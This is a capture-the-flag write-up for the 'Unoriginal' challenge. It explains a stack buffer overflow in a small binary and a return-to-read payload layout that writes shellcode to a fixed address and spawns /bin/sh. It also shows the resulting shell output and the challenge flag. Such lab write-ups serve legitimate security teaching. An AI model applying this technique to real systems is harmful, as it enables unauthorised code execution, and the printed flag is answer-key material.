# Unoriginal (RE, 100 pts)

In this challenge we're given a binary and asked to exploit it. Analyzing the binary, it turns out to be very simple:

    void func() {
	    char buf[17];
	    read(stdin, buf, 256);
	}

    int main() {
	    puts("Hack the planet!");
		func();
		return 0;
    }

So obviously, this is a stack buffer overflow. Now, all we have to do is to inject some shellcode and overwrite the return in func(), right? Well as the following stack diagram shows, if we input more than 17 chars, the next 4 bytes correspond to a memory address we can jump to directly. If only we knew the exact address of the top of the stack right now, we could simply write [17 bytes padding] [ptr to shellcode] [shellcode] and get a shell. 

    void func() {
        char buf[17]; 
        read(...)   <-- break here
    }

    Stack layout:

	+---+----
	|???| [17 bytes for buf]
	|???| [return_ptr from func back to main()]
	|???| ... [main local variables]
	|???| [return_ptr from main back to _libc_start_main]

However, I wasn't sure how to locate the position of the stack in memory. So I decided to write to a fixed memory location in the .dynamic segment, by returning to a call to read(): This means our first 256 bytes will contain a return-to-read@plt address, then 3 arguments for the read. when read is called, 21 bytes will be read from stdin.

After reading these 256 bytes and overwriting func()'s return address, execution will have passed from `func` to `read@plt`. So, after the first 256 bytes, we will pass in exactly 21 bytes of shellcode to be read by that call to read(). After reading these 21 bytes, execution will pop over to our next stack address, which exexcutes our shellcode, resulting in a call to `execve("/bin/sh", 0, 0)`.

At this point, all input will be handled by `sh`, so we can start issuing commands directly to stdout, such as enumerating the user files with `find /home`.

    [17 bytes]     padding
	0x80482f0      address of read@plt
	0x8049640      static memory to write to; this is located in the .dynamic segment. execution will return to here after read() exits
	0              first arg to read: stdin
	0x8049640      second arg to read: location to read to
	21             third arg to read: number of bytes
	[padding]      pad out to 256 bytes
	[shellcode]   
	"find /home\n"
	"cat /home/asdf/flag.txt"

Note that I send some instructions directly to stdout; we could also easily set up a command loop with something like `while True: stdout.write(raw_input()); stdout.flush();`. Either way, we find that there exists `/home/asdf/flag.txt`, so issuing the command `cat /home/asdf/flag.txt` gets us the flag `flag{youtube.com/watch?v=YBm962rQ9XI}`

	/home
	/home/asdf.tar.gz
	/home/ubuntu
	/home/ubuntu/.bashrc
	/home/ubuntu/.bash_logout
	/home/ubuntu/.ssh
	find: `/home/ubuntu/.ssh': Permission denied
	/home/ubuntu/.cache
	find: `/home/ubuntu/.cache': Permission denied
	/home/ubuntu/.profile
	/home/ubuntu/.bash_history
	/home/ubuntu/.viminfo
	/home/asdf
	/home/asdf/.bashrc
	/home/asdf/.bash_logout
	/home/asdf/flag.txt
	/home/asdf/.profile
	/home/asdf/unoriginal
	/home/asdf/pwn_serv.conf
	/home/asdf/.bash_history
	/home/asdf/.viminfo
	flag{youtube.com/watch?v=YBm962rQ9XI}

[Full Solution](unoriginal.py)
